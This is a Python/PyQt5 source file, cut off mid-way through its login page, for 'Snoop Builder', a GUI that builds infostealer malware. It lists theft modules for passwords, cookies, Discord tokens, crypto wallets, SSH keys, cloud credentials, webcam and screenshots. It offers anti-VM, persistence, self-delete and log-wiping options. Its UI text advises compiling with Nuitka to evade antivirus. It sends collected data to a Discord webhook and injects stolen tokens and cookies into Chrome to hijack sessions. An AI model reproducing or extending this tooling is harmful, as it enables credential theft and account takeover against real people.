import sys
import re
import json
import base64
import unicodedata
import subprocess
import webbrowser
from pathlib import Path
import os
import shutil

from PyQt5.QtCore import Qt
from PyQt5.QtGui import (
    QFont, QPainter, QColor, QBrush, QPainterPath, QPixmap, QIcon
)
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QPushButton, QLineEdit, QComboBox, QCheckBox, QGroupBox,
    QFileDialog, QMessageBox, QStackedWidget, QProgressBar, QTextEdit,
    QFrame, QScrollArea, QColorDialog, QSizeGrip, QGraphicsDropShadowEffect
)
import requests

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from webdriver_manager.chrome import ChromeDriverManager
    SELENIUM_OK = True
except ImportError:
    SELENIUM_OK = False


BG        = "#0a0a0c"
SIDEBAR   = "#0e0e11"
CARD      = "#111114"
INPUT     = "#17171b"
BORDER    = "#26262c"
BORDER_HI = "#3a3a44"
TEXT      = "#f2f2f5"
MUTED     = "#7a7a85"
DANGER    = "#ff4d5e"
TITLEBAR  = "#0c0c10"

MALICIOUS_MODULES = [
    "System Info", "Passwords", "Credit Cards", "Cookies",
    "History", "Downloads", "Autofill", "Extensions",
    "Discord Tokens", "Discord Metadata", "Roblox Cookies",
    "Wallets", "Browser Wallets", "Game Launchers", "Steam Extended",
    "VPN", "FTP Clients", "SSH Keys", "Cloud Credentials",
    "Telegram", "Signal", "Apps", "Environment", "Product Key",
    "WiFi Passwords", "Screenshot", "Webcam", "Files",
]

SECURITY_OPTIONS = [
    "Anti VM/Debug",
    "Anti-Tamper",
    "Startup Persistence",
    "Self-Delete",
    "Wipe Logs",
]

LANG = {
    "fr": {
        "nav_options": "Options",
        "nav_builder": "Builder",
        "nav_login": "Login",
        "nav_settings": "Paramètres",
        "section_config": "Configuration",
        "section_build": "Build",
        "section_login": "Login / Session",
        "section_settings": "Paramètres",
        "field_webhook": "Webhook",
        "btn_verify": "Vérifier",
        "field_modules": "Modules de collecte",
        "field_security": "Sécurité / Build",
        "btn_save_config": "Sauvegarder la config",
        "btn_load": "Charger",
        "btn_test_webhook": "Test webhook",
        "field_filename": "Nom du fichier (sans extension)",
        "field_filetype": "Type de sortie",
        "field_compiler": "Compilateur (si .exe)",
        "hint_compiler": "PyInstaller : rapide, .exe ~10-15 Mo, signatures connues des AV.\nNuitka : plus lent, .exe plus gros, code compilé en C → moins détecté.",
        "field_icon": "Icône EXE (optionnel, .ico)",
        "placeholder_icon": "Aucune icône sélectionnée",
        "btn_browse": "Parcourir",
        "field_buildpath": "Dossier de build",
        "field_version": "Version",
        "btn_build": "Démarrer la construction",
        "hint_login": "Vérifie un accès en direct, ou connecte Chrome avec un token/cookie. Aucune donnée n'est sauvegardée.",
        "warn_selenium": "⚠️ Selenium non installé — les boutons « Login navigateur » ne marcheront pas. Lance `pip install selenium webdriver-manager`.",
        "group_credentials": "Identifiants",
        "field_token": "Token Discord",
        "placeholder_token": "MTIzNDU2Nzg5...  ou  mfa.xxxxxxx",
        "field_roblox": "Cookie Roblox (.ROBLOSECURITY)",
        "placeholder_roblox": "_|WARNING:-DO-NOT-SHARE-THIS...",
        "field_generic": "Cookie générique (n'importe quel site)",
        "placeholder_generic": "name1=value1; name2=value2",
        "placeholder_url": "https://site.com",
        "field_open": "Ouvrir un profil dans le navigateur",
        "placeholder_open": "ID ou username Discord / Roblox",
        "btn_test": "Tester",
        "btn_login_browser": "Login navigateur",
        "btn_open": "Ouvrir",
        "group_result": "Résultat",
        "placeholder_result": "Les résultats s'afficheront ici…",
        "field_language": "Langue",
        "field_language_ui": "Langue de l'interface",
        "group_color": "Couleur d'accentuation",
        "btn_choose_color": "Choisir une couleur",
        "btn_save_settings": "Sauvegarder les paramètres",
        "msg_webhook_missing": "Veuillez entrer une URL de webhook.",
        "msg_webhook_valid": "Webhook valide.",
        "msg_return_code": "Code de retour :",
        "msg_timeout": "Délai dépassé.",
        "msg_check_failed": "Impossible de vérifier :",
        "msg_test_ok": "Webhook envoyé avec succès.",
        "msg_test_fail": "Échec",
        "msg_err": "Erreur",
        "msg_test": "Test",
        "msg_saved": "Sauvegardé",
        "msg_loaded": "Chargé",
        "msg_config_saved": "Configuration sauvegardée.",
        "msg_config_loaded": "Configuration chargée.",
        "msg_load_failed": "Impossible de charger :",
        "msg_save_failed": "Impossible de sauvegarder :",
        "msg_filename_title": "Nom invalide",
        "msg_filename_body": "Le nom du fichier ne doit contenir que des lettres, chiffres, underscores, points ou tirets.",
        "msg_webhook_invalid": "URL de webhook invalide.",
        "msg_template_missing_title": "Template manquant",
        "msg_template_missing_body": "stealer_template.py introuvable.\n\nCherché dans :",
        "msg_build_started": "Démarrage de la construction...",
        "msg_generating": "Génération :",
        "msg_script_generated": "Script généré.",
        "msg_gen_failed": "Échec de la génération :",
        "msg_py_generated": "Fichier .py généré.",
        "msg_done": "Terminé",
        "msg_file_generated": "Fichier généré :",
        "msg_compiling_pyinstaller": "Compilation EXE avec PyInstaller...",
        "msg_compiling_nuitka": "Compilation EXE avec Nuitka (peut prendre plusieurs minutes)...",
        "msg_command": "Commande :",
        "msg_build_ok": "Build EXE réussi :",
        "msg_build_fail": "Échec de la compilation. Voir les logs.",
        "msg_pyinstaller_missing": "PyInstaller introuvable. `pip install pyinstaller`.",
        "msg_nuitka_missing": "Nuitka introuvable. `pip install nuitka` puis relance.",
        "msg_unexpected": "Erreur inattendue :",
        "msg_return_code_err": "Code retour :",
        "msg_selenium_missing_title": "Selenium manquant",
        "msg_selenium_missing_body": "Selenium / webdriver-manager ne sont pas installés.\n\nLance dans un terminal :\n  pip install selenium webdriver-manager\nPuis relance le builder.",
        "msg_token_missing": "Renseigne un token Discord.",
        "msg_cookie_missing": "Renseigne un cookie Roblox.",
        "msg_cookie_url_missing": "Renseigne cookie + URL.",
        "msg_id_missing": "Renseigne un ID ou un username.",
        "msg_selenium_error": "Erreur Selenium",
        "msg_open_failed": "Impossible d'ouvrir :",
        "msg_opening": "Ouverture :",
        "result_testing_token": "[*] Test du token Discord…",
        "result_testing_cookie": "[*] Test du cookie Roblox…",
        "result_network_err": "[!] Erreur réseau :",
        "result_token_invalid": "[✗] Token invalide (401 — non autorisé)",
        "result_token_blocked": "[✗] Token bloqué (403 — banni ou restreint)",
        "result_http": "[✗] Erreur HTTP",
        "result_token_ok": "[✓] Token VALIDE",
        "result_cookie_invalid": "[✗] Cookie invalide ou expiré (401)",
        "result_cookie_ok": "[✓] Cookie VALIDE",
        "result_test_done": "\n[*] Test terminé.",
        "result_guilds": "[+] {n} serveur(s) :",
        "result_payments": "[+] {n} méthode(s) de paiement :",
        "result_opening_chrome": "[*] Ouverture de Chrome…",
        "result_injecting_token": "[*] Injection du token dans le LocalStorage…",
        "result_injecting_cookie": "[*] Injection du cookie .ROBLOSECURITY…",
        "result_inject_done": "[✓] Injection terminée.",
        "result_chrome_open": "[ℹ] Chrome reste ouvert — la session se charge dans 2-3s.",
        "result_token_may_invalidate": "[ℹ] Si Discord refuse la session, le token a été invalidé.",
        "result_cookie_inject_done": "[✓] Cookie injecté, page rechargée.",
        "result_cookie_chrome_open": "[ℹ] Chrome reste ouvert — tu devrais être connecté.",
        "result_cookie_count": "[✓] {n} cookie(s) injecté(s) sur {d}.",
        "result_fail": "[✗] Échec :",
    },
    "en": {
        "nav_options": "Options",
        "nav_builder": "Builder",
        "nav_login": "Login",
        "nav_settings": "Settings",
        "section_config": "Configuration",
        "section_build": "Build",
        "section_login": "Login / Session",
        "section_settings": "Settings",
        "field_webhook": "Webhook",
        "btn_verify": "Verify",
        "field_modules": "Collection modules",
        "field_security": "Security / Build",
        "btn_save_config": "Save config",
        "btn_load": "Load",
        "btn_test_webhook": "Test webhook",
        "field_filename": "File name (no extension)",
        "field_filetype": "Output type",
        "field_compiler": "Compiler (if .exe)",
        "hint_compiler": "PyInstaller: fast, .exe ~10-15 MB, known AV signatures.\nNuitka: slower, bigger .exe, C-compiled code → less detected.",
        "field_icon": "EXE icon (optional, .ico)",
        "placeholder_icon": "No icon selected",
        "btn_browse": "Browse",
        "field_buildpath": "Build folder",
        "field_version": "Version",
        "btn_build": "Start build",
        "hint_login": "Test live access, or log Chrome in with a token/cookie. Nothing is saved.",
        "warn_selenium": "⚠️ Selenium not installed — 'Login browser' buttons won't work. Run `pip install selenium webdriver-manager`.",
        "group_credentials": "Credentials",
        "field_token": "Discord Token",
        "placeholder_token": "MTIzNDU2Nzg5...  or  mfa.xxxxxxx",
        "field_roblox": "Roblox Cookie (.ROBLOSECURITY)",
        "placeholder_roblox": "_|WARNING:-DO-NOT-SHARE-THIS...",
        "field_generic": "Generic cookie (any site)",
        "placeholder_generic": "name1=value1; name2=value2",
        "placeholder_url": "https://site.com",
        "field_open": "Open a profile in browser",
        "placeholder_open": "Discord / Roblox ID or username",
        "btn_test": "Test",
        "btn_login_browser": "Login browser",
        "btn_open": "Open",
        "group_result": "Result",
        "placeholder_result": "Results will appear here…",
        "field_language": "Language",
        "field_language_ui": "Interface language",
        "group_color": "Accent color",
        "btn_choose_color": "Choose a color",
        "btn_save_settings": "Save settings",
        "msg_webhook_missing": "Please enter a webhook URL.",
        "msg_webhook_valid": "Webhook valid.",
        "msg_return_code": "Return code:",
        "msg_timeout": "Timeout.",
        "msg_check_failed": "Cannot verify:",
        "msg_test_ok": "Webhook sent successfully.",
        "msg_test_fail": "Failed",
        "msg_err": "Error",
        "msg_test": "Test",
        "msg_saved": "Saved",
        "msg_loaded": "Loaded",
        "msg_config_saved": "Configuration saved.",
        "msg_config_loaded": "Configuration loaded.",
        "msg_load_failed": "Cannot load:",
        "msg_save_failed": "Cannot save:",
        "msg_filename_title": "Invalid name",
        "msg_filename_body": "File name must contain only letters, digits, underscores, dots or dashes.",
        "msg_webhook_invalid": "Invalid webhook URL.",
        "msg_template_missing_title": "Template missing",
        "msg_template_missing_body": "stealer_template.py not found.\n\nSearched in:",
        "msg_build_started": "Starting build...",
        "msg_generating": "Generating:",
        "msg_script_generated": "Script generated.",
        "msg_gen_failed": "Generation failed:",
        "msg_py_generated": ".py file generated.",
        "msg_done": "Done",
        "msg_file_generated": "File generated:",
        "msg_compiling_pyinstaller": "Compiling EXE with PyInstaller...",
        "msg_compiling_nuitka": "Compiling EXE with Nuitka (may take several minutes)...",
        "msg_command": "Command:",
        "msg_build_ok": "EXE build succeeded:",
        "msg_build_fail": "Build failed. Check the logs.",
        "msg_pyinstaller_missing": "PyInstaller not found. `pip install pyinstaller`.",
        "msg_nuitka_missing": "Nuitka not found. `pip install nuitka` then retry.",
        "msg_unexpected": "Unexpected error:",
        "msg_return_code_err": "Return code:",
        "msg_selenium_missing_title": "Selenium missing",
        "msg_selenium_missing_body": "Selenium / webdriver-manager not installed.\n\nRun in a terminal:\n  pip install selenium webdriver-manager\nThen restart the builder.",
        "msg_token_missing": "Enter a Discord token.",
        "msg_cookie_missing": "Enter a Roblox cookie.",
        "msg_cookie_url_missing": "Enter cookie + URL.",
        "msg_id_missing": "Enter an ID or username.",
        "msg_selenium_error": "Selenium error",
        "msg_open_failed": "Cannot open:",
        "msg_opening": "Opening:",
        "result_testing_token": "[*] Testing Discord token…",
        "result_testing_cookie": "[*] Testing Roblox cookie…",
        "result_network_err": "[!] Network error:",
        "result_token_invalid": "[✗] Invalid token (401 — unauthorized)",
        "result_token_blocked": "[✗] Token blocked (403 — banned or restricted)",
        "result_http": "[✗] HTTP error",
        "result_token_ok": "[✓] Token VALID",
        "result_cookie_invalid": "[✗] Invalid or expired cookie (401)",
        "result_cookie_ok": "[✓] Cookie VALID",
        "result_test_done": "\n[*] Test finished.",
        "result_guilds": "[+] {n} server(s):",
        "result_payments": "[+] {n} payment method(s):",
        "result_opening_chrome": "[*] Opening Chrome…",
        "result_injecting_token": "[*] Injecting token into LocalStorage…",
        "result_injecting_cookie": "[*] Injecting .ROBLOSECURITY cookie…",
        "result_inject_done": "[✓] Injection done.",
        "result_chrome_open": "[ℹ] Chrome stays open — session loads in 2-3s.",
        "result_token_may_invalidate": "[ℹ] If Discord rejects the session, the token was invalidated.",
        "result_cookie_inject_done": "[✓] Cookie injected, page reloaded.",
        "result_cookie_chrome_open": "[ℹ] Chrome stays open — you should be logged in.",
        "result_cookie_count": "[✓] {n} cookie(s) injected on {d}.",
        "result_fail": "[✗] Failed:",
    },
}

APP_DIR = Path(__file__).resolve().parent


def _find_asset(*relatives):
    for rel in relatives:
        for base in (APP_DIR, Path.cwd()):
            p = base / rel
            if p.exists():
                return p
    return None


class LogoWidget(QWidget):
    def __init__(self, parent=None, color="#9d4edd"):
        super().__init__(parent)
        self._color = color
        self.setFixedSize(22, 22)

    def set_color(self, c):
        self._color = c
        self.update()

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing)
        logo_path = _find_asset("assets/logo.png", "logo.png")
        if logo_path:
            pixmap = QPixmap(str(logo_path))
            if not pixmap.isNull():
                p.drawPixmap(0, 0, 22, 22,
                             pixmap.scaled(22, 22, Qt.KeepAspectRatio, Qt.SmoothTransformation))
                return
        path = QPainterPath()
        path.moveTo(3, 17)
        path.cubicTo(7, 7, 15, 5, 20, 11)
        path.cubicTo(15, 13, 11, 19, 3, 17)
        p.setBrush(QBrush(QColor(self._color)))
        p.setPen(Qt.NoPen)
        p.drawPath(path)
        p.setBrush(QBrush(QColor(BG)))
        p.drawEllipse(9, 10, 5, 5)
        p.setBrush(QBrush(QColor(self._color)))
        p.drawEllipse(11, 12, 2, 2)


class TitleButton(QPushButton):
    def __init__(self, kind, parent=None):
        super().__init__(parent)
        self.kind = kind
        self.setFixedSize(36, 28)
        self.setCursor(Qt.PointingHandCursor)
        self._hover = False
        self.setFlat(True)
        self.setStyleSheet("QPushButton { background: transparent; border: none; }")

    def enterEvent(self, e):
        self._hover = True
        self.update()

    def leaveEvent(self, e):
        self._hover = False
        self.update()

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing)
        if self._hover:
            bg = QColor(DANGER) if self.kind == "close" else QColor("#2a2a32")
            p.setBrush(QBrush(bg))
            p.setPen(Qt.NoPen)
            p.drawRoundedRect(0, 0, self.width(), self.height(), 4, 4)
        p.setPen(QColor(TEXT if self._hover else MUTED))
        pen = p.pen()
        pen.setWidthF(1.4)
        p.setPen(pen)
        cx = self.width() // 2
        cy = self.height() // 2
        if self.kind == "close":
            p.drawLine(cx - 5, cy - 5, cx + 5, cy + 5)
            p.drawLine(cx - 5, cy + 5, cx + 5, cy - 5)
        else:
            p.drawLine(cx - 5, cy, cx + 5, cy)


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Snoop Builder")
        self.resize(1180, 780)
        self.setMinimumSize(950, 640)
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.Window)
        self.setAttribute(Qt.WA_TranslucentBackground)

        self.accent_color = "#9d4edd"
        self.current_language = "fr"
        self._drag_pos = None

        self.settings_file = Path.home() / ".snoop_builder_settings.json"
        self.load_settings()

        self.module_checkboxes = {}
        self.security_checkboxes = {}
        self._t_refs = []

        self.setStyleSheet(self.styles())
        self._build_ui()

    def _t(self, key, **fmt):
        s = LANG.get(self.current_language, LANG["fr"]).get(key, key)
        if fmt:
            try:
                s = s.format(**fmt)
            except Exception:
                pass
        return s

    def _reg(self, widget, key):
        self._t_refs.append((widget, key, None))
        return widget

    def _reg_ph(self, widget, key):
        self._t_refs.append((widget, key, "placeholder"))
        return widget

    def _apply_language(self):
        for widget, key, mode in self._t_refs:
            try:
                if mode == "placeholder":
                    widget.setPlaceholderText(self._t(key))
                else:
                    widget.setText(self._t(key))
            except Exception:
                pass

    def styles(self):
        return f"""
        QWidget {{
            background: transparent;
            color: {TEXT};
            font-family: 'Segoe UI', Arial;
            font-size: 13px;
        }}
        QFrame#root {{
            background: {BG};
            border: 1px solid {BORDER};
            border-radius: 10px;
        }}
        QLabel#title {{ font-size: 13px; font-weight: 600; color: {TEXT}; }}
        QLabel#version {{ color: {MUTED}; font-size: 10px; }}
        QLabel#section {{ color: {self.accent_color}; font-size: 16px; font-weight: 700; }}
        QLabel#field {{ font-weight: 600; color: {TEXT}; }}
        QLabel#hint {{ color: {MUTED}; font-size: 11px; }}
        QLabel#brand {{ color: {self.accent_color}; font-size: 10px; }}
        QLineEdit, QComboBox {{
            background: {INPUT};
            border: 1px solid {BORDER};
            border-radius: 6px;
            padding: 9px 12px;
            color: {TEXT};
            selection-background-color: {self.accent_color};
        }}
        QLineEdit:focus, QComboBox:focus {{
            border: 1px solid {self.accent_color};
        }}
        QLineEdit:read-only {{ color: {MUTED}; }}
        QComboBox::drop-down {{ width: 26px; border: none; }}
        QComboBox QAbstractItemView {{
            background: {CARD};
            border: 1px solid {BORDER};
            selection-background-color: {self.accent_color};
            color: {TEXT};
            outline: none;
        }}
        QGroupBox {{
            background: {CARD};
            border: 1px solid {BORDER};
            border-radius: 8px;
            margin-top: 14px;
            padding: 22px 16px 16px 16px;
            font-weight: 600;
            color: {TEXT};
        }}
        QGroupBox::title {{
            subcontrol-origin: margin;
            left: 14px;
            padding: 0 6px;
            color: {self.accent_color};
            font-weight: 600;
        }}
        QCheckBox {{ spacing: 9px; padding: 5px 0; color: {TEXT}; }}
        QCheckBox::indicator {{
            width: 18px; height: 18px;
            border: 1.5px solid {BORDER_HI};
            border-radius: 4px;
            background: transparent;
        }}
        QCheckBox::indicator:hover {{ border: 1.5px solid {self.accent_color}; }}
        QCheckBox::indicator:checked {{
            background: {self.accent_color};
            border: 1.5px solid {self.accent_color};
        }}
        QPushButton {{
            background: {self.accent_color};
            color: white;
            border: none;
            border-radius: 6px;
            padding: 9px 16px;
            font-weight: 600;
        }}
        QPushButton:hover {{ background: {self._lighten(self.accent_color, 15)}; }}
        QPushButton:pressed {{ background: {self._darken(self.accent_color, 20)}; }}
        QPushButton:disabled {{ background: #2a2a32; color: {MUTED}; }}
        QPushButton#secondary {{
            background: #1c1c22;
            border: 1px solid {BORDER};
            color: {TEXT};
        }}
        QPushButton#secondary:hover {{ background: #26262e; border: 1px solid {BORDER_HI}; }}
        QPushButton#nav {{
            text-align: left; padding: 12px 16px; border: none;
            background: transparent; color: {MUTED}; font-weight: 500;
            border-radius: 6px;
        }}
        QPushButton#nav:hover {{ background: #18181d; color: {TEXT}; }}
        QProgressBar {{
            border: 1px solid {BORDER};
            border-radius: 6px;
            background: #14141a;
            text-align: center;
            height: 22px;
            color: {TEXT};
        }}
        QProgressBar::chunk {{ background: {self.accent_color}; border-radius: 5px; }}
        QTextEdit {{
            background: #0c0c10;
            border: 1px solid {BORDER};
            border-radius: 6px;
            padding: 8px;
            color: #b8b8c2;
            font-family: 'Consolas', 'Cascadia Mono', monospace;
            font-size: 11px;
        }}
        QScrollArea {{ border: none; background: transparent; }}
        QScrollBar:vertical {{
            background: transparent; width: 8px; margin: 2px;
        }}
        QScrollBar::handle:vertical {{
            background: #2e2e38; border-radius: 4px; min-height: 30px;
        }}
        QScrollBar::handle:vertical:hover {{ background: {self.accent_color}; }}
        QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {{ height: 0; }}
        """

    @staticmethod
    def _lighten(hex_color, pct):
        c = QColor(hex_color)
        h, s, l, a = c.getHsl()
        l = min(255, l + int(255 * pct / 100))
        return QColor.fromHsl(h, s, l, a).name()

    @staticmethod
    def _darken(hex_color, pct):
        c = QColor(hex_color)
        h, s, l, a = c.getHsl()
        l = max(0, l - int(255 * pct / 100))
        return QColor.fromHsl(h, s, l, a).name()

    def _build_ui(self):
        outer = QWidget()
        self.setCentralWidget(outer)
        outer_l = QVBoxLayout(outer)
        outer_l.setContentsMargins(12, 12, 12, 12)

        self.root = QFrame()
        self.root.setObjectName("root")
        outer_l.addWidget(self.root)

        shadow = QGraphicsDropShadowEffect(self)
        shadow.setBlurRadius(30)
        shadow.setColor(QColor(0, 0, 0, 180))
        shadow.setOffset(0, 6)
        self.root.setGraphicsEffect(shadow)

        root_l = QVBoxLayout(self.root)
        root_l.setContentsMargins(0, 0, 0, 0)
        root_l.setSpacing(0)

        top = QFrame()
        top.setFixedHeight(46)
        top.setStyleSheet(
            f"QFrame {{ background: {TITLEBAR};"
            f" border-top-left-radius: 10px; border-top-right-radius: 10px;"
            f" border-bottom: 1px solid {BORDER}; }}"
        )
        tl = QHBoxLayout(top)
        tl.setContentsMargins(14, 0, 6, 0)
        tl.setSpacing(8)

        self.logo = LogoWidget(color=self.accent_color)
        title = QLabel("Snoop Builder")
        title.setObjectName("title")
        version = QLabel("v1.7")
        version.setObjectName("version")

        tl.addWidget(self.logo)
        tl.addWidget(title)
        tl.addWidget(version)
        tl.addStretch()

        self.btn_min = TitleButton("min")
        self.btn_close = TitleButton("close")
        self.btn_min.clicked.connect(self.showMinimized)
        self.btn_close.clicked.connect(self.close)
        tl.addWidget(self.btn_min)
        tl.addWidget(self.btn_close)

        top.mousePressEvent = self._title_press
        top.mouseMoveEvent = self._title_move
        top.mouseReleaseEvent = self._title_release

        root_l.addWidget(top)

        body = QHBoxLayout()
        body.setContentsMargins(0, 0, 0, 0)
        body.setSpacing(0)
        root_l.addLayout(body, 1)

        sidebar = QFrame()
        sidebar.setFixedWidth(180)
        sidebar.setStyleSheet(
            f"QFrame {{ background: {SIDEBAR}; border-right: 1px solid {BORDER}; }}"
        )
        sl = QVBoxLayout(sidebar)
        sl.setContentsMargins(12, 18, 12, 14)
        sl.setSpacing(4)

        self.btn_options = self._nav_button()
        self.btn_builder = self._nav_button()
        self.btn_login = self._nav_button()
        self.btn_settings = self._nav_button()
        self._reg(self.btn_options, "nav_options")
        self._reg(self.btn_builder, "nav_builder")
        self._reg(self.btn_login, "nav_login")
        self._reg(self.btn_settings, "nav_settings")

        sl.addWidget(self.btn_options)
        sl.addWidget(self.btn_builder)
        sl.addWidget(self.btn_login)
        sl.addWidget(self.btn_settings)
        sl.addStretch()

        gh = QLabel("github.com/weasel743/SnoopBuilder")
        gh.setObjectName("brand")
        gh.setAlignment(Qt.AlignCenter)
        sl.addWidget(gh)

        body.addWidget(sidebar)

        self.stack = QStackedWidget()
        body.addWidget(self.stack, 1)

        self.stack.addWidget(self._options_page())
        self.stack.addWidget(self._builder_page())
        self.stack.addWidget(self._login_page())
        self.stack.addWidget(self._settings_page())

        self.btn_options.clicked.connect(lambda: self.stack.setCurrentIndex(0))
        self.btn_builder.clicked.connect(lambda: self.stack.setCurrentIndex(1))
        self.btn_login.clicked.connect(lambda: self.stack.setCurrentIndex(2))
        self.btn_settings.clicked.connect(lambda: self.stack.setCurrentIndex(3))

        self._set_nav_active(self.btn_options)
        self.stack.currentChanged.connect(self._update_nav)

        grip_row = QHBoxLayout()
        grip_row.setContentsMargins(0, 0, 4, 4)
        grip_row.addStretch()
        grip = QSizeGrip(self.root)
        grip.setFixedSize(14, 14)
        grip_row.addWidget(grip)
        root_l.addLayout(grip_row)

    def _title_press(self, e):
        if e.button() == Qt.LeftButton:
            self._drag_pos = e.globalPos() - self.frameGeometry().topLeft()
            e.accept()

    def _title_move(self, e):
        if self._drag_pos and (e.buttons() & Qt.LeftButton):
            self.move(e.globalPos() - self._drag_pos)
            e.accept()

    def _title_release(self, e):
        self._drag_pos = None

    def _nav_button(self):
        b = QPushButton("")
        b.setObjectName("nav")
        b.setCursor(Qt.PointingHandCursor)
        return b

    def _update_nav(self, index):
        if index == 0:
            self._set_nav_active(self.btn_options)
        elif index == 1:
            self._set_nav_active(self.btn_builder)
        elif index == 2:
            self._set_nav_active(self.btn_login)
        else:
            self._set_nav_active(self.btn_settings)

    def _set_nav_active(self, active):
        for b in (self.btn_options, self.btn_builder, self.btn_login, self.btn_settings):
            if b is active:
                b.setStyleSheet(f"""
                    QPushButton {{
                        text-align: left; padding: 12px 16px; border: none;
                        background: #1c1c22; color: {self.accent_color}; font-weight: 600;
                        border-radius: 6px;
                        border-left: 3px solid {self.accent_color};
                    }}
                """)
            else:
                b.setStyleSheet(f"""
                    QPushButton {{
                        text-align: left; padding: 12px 16px; border: none;
                        background: transparent; color: {MUTED}; font-weight: 500;
                        border-radius: 6px;
                        border-left: 3px solid transparent;
                    }}
                    QPushButton:hover {{ background: #18181d; color: {TEXT}; }}
                """)

    def _content_wrap(self):
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setFrameShape(QFrame.NoFrame)
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(28, 22, 24, 22)
        l.setSpacing(14)
        scroll.setWidget(w)
        return scroll, l

    def _section(self, key):
        x = QLabel("")
        x.setObjectName("section")
        self._reg(x, key)
        return x

    def _field(self, key):
        x = QLabel("")
        x.setObjectName("field")
        self._reg(x, key)
        return x

    def _btn(self, key, kind="primary", width=None):
        b = QPushButton("")
        if kind == "secondary":
            b.setObjectName("secondary")
        b.setCursor(Qt.PointingHandCursor)
        if width:
            b.setFixedWidth(width)
        self._reg(b, key)
        return b

    def _options_page(self):
        w, l = self._content_wrap()
        l.addWidget(self._section("section_config"))

        webhook = QGroupBox(self._t("field_webhook"))
        self.webhook_group = webhook
        wl = QHBoxLayout(webhook)
        wl.setSpacing(8)
        self.webhook = QLineEdit()
        self.webhook.setPlaceholderText("https://discord.com/api/webhooks/...")
        btn_verify = self._btn("btn_verify", width=110)
        btn_verify.clicked.connect(self.verify_webhook)
        wl.addWidget(self.webhook, 1)
        wl.addWidget(btn_verify)
        l.addWidget(webhook)

        modules = QGroupBox(self._t("field_modules"))
        self.modules_group = modules
        ml = QHBoxLayout(modules)
        ml.setSpacing(20)
        cols = [QVBoxLayout(), QVBoxLayout(), QVBoxLayout(), QVBoxLayout()]
        for c in cols:
            c.setSpacing(2)
        for i, name in enumerate(MALICIOUS_MODULES):
            cb = QCheckBox(name)
            cb.setCursor(Qt.PointingHandCursor)
            cb.setChecked(True)
            self.module_checkboxes[name] = cb
            cols[i % 4].addWidget(cb)
        for c in cols:
            ml.addLayout(c)
        l.addWidget(modules)

        opts = QGroupBox(self._t("field_security"))
        self.security_group = opts
        ol = QHBoxLayout(opts)
        ol.setSpacing(20)
        for text in SECURITY_OPTIONS:
            cb = QCheckBox(text)
            cb.setCursor(Qt.PointingHandCursor)
            cb.setChecked(True)
            self.security_checkboxes[text] = cb
            ol.addWidget(cb)
        ol.addStretch()
        l.addWidget(opts)

        row = QHBoxLayout()
        row.setSpacing(8)
        save = self._btn("btn_save_config", kind="secondary")
        save.clicked.connect(self.save_config)
        load = self._btn("btn_load", kind="secondary")
        load.clicked.connect(self.load_config)
        test = self._btn("btn_test_webhook", kind="secondary")
        test.clicked.connect(self.test_send_webhook)
        row.addWidget(save)
        row.addWidget(load)
        row.addStretch()
        row.addWidget(test)
        l.addLayout(row)
        l.addStretch()
        return w

    def _builder_page(self):
        w, l = self._content_wrap()
        l.addWidget(self._section("section_build"))

        form = QVBoxLayout()
        form.setSpacing(10)

        form.addWidget(self._field("field_filename"))
        self.filename = QLineEdit("snoop_payload")
        form.addWidget(self.filename)

        form.addWidget(self._field("field_filetype"))
        self.filetype = QComboBox()
        self.filetype.addItems([".py", ".exe"])
        self.filetype.currentTextChanged.connect(self._on_filetype_changed)
        form.addWidget(self.filetype)

        form.addWidget(self._field("field_compiler"))
        self.compiler = QComboBox()
        self.compiler.addItems(["PyInstaller", "Nuitka"])
        self.compiler.setEnabled(False)
        form.addWidget(self.compiler)

        hint = QLabel(self._t("hint_compiler"))
        hint.setObjectName("hint")
        hint.setWordWrap(True)
        self.hint_compiler = hint
        form.addWidget(hint)

        form.addWidget(self._field("field_icon"))
        icon_row = QHBoxLayout()
        icon_row.setSpacing(8)
        self.icon = QLineEdit()
        self.icon.setReadOnly(True)
        self._reg_ph(self.icon, "placeholder_icon")
        btn_icon = self._btn("btn_browse", kind="secondary")
        btn_icon.clicked.connect(self.choose_icon)
        icon_row.addWidget(self.icon, 1)
        icon_row.addWidget(btn_icon)
        form.addLayout(icon_row)

        form.addWidget(self._field("field_buildpath"))
        path_row = QHBoxLayout()
        path_row.setSpacing(8)
        self.buildpath = QLineEdit(str(Path.home() / "Desktop" / "SnoopBuild"))
        btn_path = self._btn("btn_browse", kind="secondary")
        btn_path.clicked.connect(self.choose_path)
        path_row.addWidget(self.buildpath, 1)
        path_row.addWidget(btn_path)
        form.addLayout(path_row)

        form.addWidget(self._field("field_version"))
        self.version = QLineEdit("1.0.0")
        form.addWidget(self.version)

        l.addLayout(form)
        l.addStretch()

        self.progress = QProgressBar()
        self.progress.setValue(0)
        self.progress.setVisible(False)
        l.addWidget(self.progress)

        self.logs = QTextEdit()
        self.logs.setReadOnly(True)
        self.logs.setFixedHeight(140)
        self.logs.setVisible(False)
        l.addWidget(self.logs)

        row = QHBoxLayout()
        row.addStretch()
        self.btn_build = self._btn("btn_build")
        self.btn_build.setMinimumWidth(240)
        self.btn_build.setMinimumHeight(46)
        self.btn_build.clicked.connect(self.start_build)
        row.addWidget(self.btn_build)
        row.addStretch()
        l.addLayout(row)
        return w

    def _on_filetype_changed(self, text):
        self.compiler.setEnabled(text == ".exe")

    def _login_page(self):
        w, l = self._content_wrap()
        l.addWidget(self._section("section_login"))

        hint = QLabel(self._t("hint_login"))
        hint.setObjectName("hint")
        hint.setWordWrap(True)
        self.hint_login = hint
        l.addWidget(hint)

        if not SELENIUM_OK:
            warn = QLabel(self._t("warn_selenium"))
            warn.setWordWrap(True)
            warn.setStyleSheet(
                f"color: {DANGER}; background: #1a0a0c; border: 1px solid #3a1a1c; "
                f"padding: 8px; border-radius: 6px;"
            )
            self.warn_selenium = warn
            l.addWidget(warn)

        dc = QGroupBox(self._t("group_credentials"))
        self.cred_group = dc
